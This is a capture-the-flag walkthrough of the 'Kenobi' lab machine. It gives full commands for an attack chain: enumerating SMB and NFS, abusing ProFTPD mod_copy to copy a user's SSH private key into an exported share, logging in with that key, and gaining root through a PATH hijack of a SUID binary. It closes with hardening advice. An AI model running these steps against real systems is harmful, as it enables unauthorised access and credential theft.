# Kenobi

## 1. Overview

- **Objective:** Capture `user.txt` and `root.txt` flags.  
- **Attack path summary:**  
  SMB enumeration → ProFTPD misconfiguration (mod_copy) → NFS mount → SSH with stolen key → PATH hijack in custom SUID binary → root.

---

## 2. Reconnaissance

### FTP Banner Grab
We check the FTP service with netcat:
```bash
nc 10.49.164.10 21
```
**Result:**  
```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.164.10]
```
- **Concept:** Banner grabbing shows service version. Here, ProFTPD 1.3.5 is vulnerable.

### SMB Enumeration
We scan for SMB shares:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.164.10
```
**Result:** 3 shares found — `admin`, `anonymous`, `IPC$`.

Connecting to the `anonymous` share reveals:
```
log.txt
```
- **Concept:** SMB shares can leak files. `log.txt` hints at ProFTPD configuration.

### NFS Enumeration
We check rpcbind/NFS:
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.164.10
```
**Result:**  
```
/var
```
- **Concept:** NFS exports directories over the network. `/var` is accessible.

---

## 3. Initial Access

### Exploiting ProFTPD mod_copy
ProFTPD’s `mod_copy` lets us copy files without logging in. Use raw FTP commands:
```bash
ftp 10.49.164.10
quote SITE CPFR /home/kenobi/.ssh/id_rsa
quote SITE CPTO /var/tmp/id_rsa
```
**Result:** Key copied successfully into `/var/tmp/id_rsa`.

### Mounting NFS to Retrieve Key
```bash
sudo mkdir /mnt/kenobi
sudo mount -t nfs 10.49.164.10:/var /mnt/kenobi
ls -la /mnt/kenobi/tmp
```
**Result:** `id_rsa` is visible.

### Preparing Key and SSH Login
Copy locally and fix permissions:
```bash
cp /mnt/kenobi/tmp/id_rsa ~/id_rsa
chmod 600 ~/id_rsa
ssh -i ~/id_rsa kenobi@10.49.164.10
```
**Result:** Shell as user `kenobi`.

---

## 4. Privilege Escalation

### SUID Enumeration
```bash
find / -user root -perm -4000 -type f 2>/dev/null
```
**Result:** Custom binary `/usr/bin/menu`.

### Inspecting `/usr/bin/menu`
```bash
strings /usr/bin/menu
```
**Result:** Calls `curl`, `uname`, `ifconfig` via `system()` without absolute paths.

- **Concept:** PATH hijack — if a program runs commands without full paths, we can trick it into running our malicious version.

### Exploit
Create fake `curl`:
```bash
echo "/bin/bash" > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
Choose option `1` (status check).  
**Result:** Root shell.

---

## 5. Flags

### User Flag
```bash
cat /home/kenobi/user.txt
```

### Root Flag
```bash
cat /root/root.txt
```

---

## 6. Final Notes

- **Hardening:**  
  - Disable ProFTPD `mod_copy`.  
  - Restrict NFS exports.  
  - Audit and remove unsafe SUID binaries.  
  - Always use absolute paths in privileged code.

- **Lessons:**  
  - Enumeration reveals misconfigurations.  
  - Chaining services (SMB → FTP → NFS) is powerful.  
  - PATH hijacking is a classic privilege escalation.
